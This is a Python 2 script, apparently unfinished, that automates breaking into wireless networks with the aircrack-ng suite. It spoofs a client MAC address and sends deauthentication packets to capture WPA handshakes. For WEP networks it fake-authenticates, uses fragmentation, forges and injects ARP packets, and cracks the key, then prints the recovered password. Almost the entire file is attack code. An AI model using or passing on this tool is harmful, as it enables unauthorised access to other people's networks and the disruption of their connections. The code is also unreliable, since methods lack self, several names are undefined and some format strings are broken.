#!/usr/bin/env python
# -*- coding: utf-8 -*-

import time
import pexpect
import fcntl
import os
import sys
import optparse
import threading
import re
import sts
try:
    import psyco
    psyco.full()
except ImportError:
    print 'WARNING: Psyco not installed.'


class wpaAP(threading.Thread):
    def __init__(self, bssid, essid, iface, channel, client):
        threading.Thread.__init__(self)
        self.bssid = bssid
        self.essid = essid
        self.iface = iface
        self.channel = channel
        self.client = client

    def get_handshake():
        pexpect.run("killall -9 airodump-ng")
        rm_cmd = "rm -f ./handshake-%s*; rm -f /tmp/autohs*" % bssid
        child = pexpect.spawn('/bin/bash', ['-c', rm_cmd])

        print "SETTING CARD ON RIGHT CHANNEL & RATE"
        pexpect.run("ifconfig %s down" % iface)
        pexpect.run("macchanger --mac %s %s" % (client, iface))
      # Заменить на airmon.
        pexpect.run("iwconfig %s channel %s rate 1M" % (iface, channel))
        pexpect.run("ifconfig %s up" % iface)

        print "LAUNCHING BACKGROUND CAPTURE TASK..."
        Capture(iface, channel, bssid, client).start()
        sleep(1)
        i = 0
        while not got_handshake():
            if iter == 0:
                print "LAUNCHING ATTACK, PLEASE BE PATIENT..."
            else:
                print "HANDSHAKE NOT CAPTURED, TRIED %s TIMES" % i
            pexpect.run("aireplay-ng --deauth 1 -a %s -c %s %s" % (bssid, client, iface))
            i += 1
            sleep(1)
        popen3("mv -f /tmp/autohs-01.cap '/handshake-.cap' " % (os.getcwd, essid))
        print "HANDSHAKE CAPTURED & SAVED IN FILE (TRIED %s TIMES) %s/handshake-%s.cap" % (i, os.getcwd, essid)
        clean(iface)

    def got_handshake():
        checker = pexpect.spawn("aircrack-ng  /tmp/autohs*.cap ");
        handshake = check.expect(["0 handshake",
                                  "no valid wpa handshake",
                                  "no data",
                                  "no networks found",
                                  pexpect.TIMEOUT,
                                  pexpect.EOF])
        checker.close()
        return handshake


class wepAP(threading.Thread):
    def __init__(self, card, channel, ap, clients):
        threading.Thread.__init__(self)
        self.card = card
        self.channel = channel
        self.ap = ap
        self.clients = clients

    def getMac(interface):
# TODO 'ifconfig wlan0 | grep HWaddr | cut -d" " -f10'?
        for line in os.popen('ifconfig %s' % interface):
            where = line.find('HWaddr')
            if where > -1:
                return line[(where+7):(where+24)]
            return None

    def startmon(channel, interface):
        monitor = pexpect.spawn('airodump-ng %s --encrypt WEP --channel %s' % (interface, channel))
        print 'airodump-ng %s --encrypt WEP --channel %s' % (interface, channel)
        time.sleep(5)
        return monitor

    def startAuthAP(mac, ap, interface, channel):
        auth = pexpect.spawn('/bin/bash')
        auth.logfile = sys.stdout
        auth.sendline('airodump-ng %s --encrypt WEP --channel %s &' % (interface, channel))
        auth.sendline('aireplay-ng --fakeauth=0 -e %s -a %s -h %s %s' % (''.join(ap[1]), ''.join(ap[0]), mac, interface))
        index = auth.expect(['Association successful', 'Attack was unsuccessful.', pexpect.TIMEOUT, pexpect.EOF], 300)
        auth.close()
        return index

    def fragment(hostMac, apMac, interface):
        fragmentFile = None
        frag = pexpect.spawn('aireplay-ng --fragment -h %s -b %s %s' % (hostMac, apMac, interface))
        fragLogName = 'frag_temp.log'
        frag.logfile = file(fragLogName, 'w')
        index1 = frag.expect(['Use this packet',
                              pexpect.TIMEOUT,
                              pexpect.EOF], 180)
        if index1 == 0:
            frag.sendline('y')
            index2 = frag.expect(['Now you can build a packet with packetforge-ng',
                                  'failed',
                                  pexpect.TIMEOUT,
                                  pexpect.EOF], 600)
            frag.close()
            if index2 == 0:
                fragLogFile = open(fragLogName, 'r')
                for line in fragLogFile:
                    if (line.find('Saving keystream in ') > -1):
                        fragmentFile = line[20:-1]
        if fragmentFile is None:
            print 'Failed to get a data packet'
        return fragmentFile

    def attack(fragmentFile, hostMac, apMac, channel, interface):
        arp = pexpect.spawn('packetforge-ng -0 -a %s -h %s -k 255.255.255.255 -l 255.255.255.255 -y %s -w arp-request'
                            % (apMac, hostMac, fragmentFile))
        arp.expect('Wrote packet to: arp-request', 60)
        arp.close()
        attack = pexpect.spawn('/bin/bash')
        attack.sendline('airodump-ng -c %s --bssid %s -w capture %s &' % (channel, apMac, interface))
        attack.expect(pexpect.TIMEOUT, 10)
        attack.sendline('aireplay-ng -2 -r arp-request %s' % interface)
        index1 = attack.expect(['Use this packet ?', pexpect.TIMEOUT, pexpect.EOF])
        if index1 == 0:
            attack.sendline('y')
            attack.expect(pexpect.TIMEOUT, 300)
        else:
            print 'Failed to inject arp packet!'
        attack.close()

    def getKey(apMac):
        key = None
        getKey = pexpect.spawn('/bin/bash')
        getKeyLogName = 'key_temp.log'
        getKey.logfile = file(getKeyLogName, 'w')
        getKey.sendline('aircrack-ng -b %s capture-*.cap' % apMac)
        index = getKey.expect(['KEY FOUND!', 'Failed', pexpect.TIMEOUT, pexpect.EOF], 180)
        if index == 0:
            getKeyLogFile = open(getKeyLogName, 'r')
            for line in getKeyLogFile:
                where = line.find('KEY FOUND!')
                if (where > -1):
                    key = line[where+13:where+27]
        if key is None:
            print 'Failed to get key!'
        return key

    def getPasswd(ap, interface):
        key = None
        mac = getMac(interface)
        index = startAuthAP(mac, ap, interface, ''.join(ap[2]))
        fragmentFile = None
        if index == 0:
            fragmentFile = fragment(mac, ''.join(ap[0]), interface)
        else:
            print 'Auth Failed'
            return key
        if not (fragmentFile is None):
            attack(fragmentFile, mac, ''.join(ap[0]), ''.join(ap[2]), interface)
            key = getKey(''.join(ap[0]))
        return key



def clean(interface):
    pexpect.run('airmon-ng stop %s' % interface)
    pexpect.run("killall -9 airodump-ng")


if __name__ == '__main__':
    try:
        interface = None
# TODO Не pexpect.run или os.popen как в 77?
        getInterFace = pexpect.spawn('ifconfig -a')
        mon = re.compile('mon(\d)')
        index = getInterFace.expect([pexpect.EOF, mon])
# TODO Вытащить (\d) и поройтись циклом.
        if index:
            pexpect.run('airmon-ng stop mon0')
        init = pexpect.spawn('airmon-ng start wlan0')
# TODO все логи в tmp или по выбору (глобальная переменная, файл конфига?)
        initLogName = 'init_temp.log'
        init.logfile = file(initLogName, 'w')
        init.expect(['monitor mode enabled',pexpect.TIMEOUT, pexpect.EOF])
        init.close()
        initLogFile = open(initLogName, 'r')
        log = initLogFile.readlines()
        for line in log:
            where = line.find('monitor mode enabled on')
            if where > -1:
                interface = line[(where+24):(where+28)]
        if interface is None:
            print 'ERROR: Failed to initiate monitor mode.'
            print log
            clean(interface)
            quit()

        apList = sts.start(interface)
        if apList is None:
            print 'No wireless Access Point found.'
            clean(interface)
            quit()

        num = sts.choose(apList)
        if num == 0:
            print "Okay..."
            clean(interface)
            quit()

        passwd = getPasswd(apList[num-1], interface)
        clean(interface)
        print 'AP %s\'s password is %s' % (apList[num -1], passwd)

    except KeyboardInterrupt:
        print "Cleaning up..."
        clean("wlan0")
